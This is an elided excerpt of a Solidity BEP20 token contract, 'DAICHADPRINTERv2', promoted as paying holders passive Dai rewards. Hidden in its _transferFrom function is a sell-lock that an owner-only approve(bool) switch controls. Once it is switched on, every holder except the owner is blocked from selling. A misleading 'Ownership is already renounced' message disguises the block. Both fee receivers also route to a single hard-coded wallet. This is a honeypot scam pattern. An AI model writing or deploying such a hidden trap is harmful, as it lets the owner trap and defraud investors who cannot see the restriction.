...
/**
DaiChadsPrinterv2 $DCP
Inspired by @DaiChadsPrinter

Hold DaiChadsPrinterv2 and get passive Rewards in Dai!!! (boosted)
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 EP = IBEP20(0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Abf3E); // dai
...
contract DAICHADPRINTERv2 is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "DAICHADPRINTERv2";
    string constant _symbol = "DCPv2";
    ...
    address public autoLiquidityReceiver=0x6BC2CC97FCf69667B90838A2C540ee78FD3dbf4F; 
    address public marketingFeeReceiver=0x6BC2CC97FCf69667B90838A2C540ee78FD3dbf4F; 
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!Approved || sender==owner), "Ownership is already renounced");
...
//        emit Transfer(sender, recipient, amount);
    ...
    function  approve(bool value) external onlyOwner {
        Approved = value;
    }
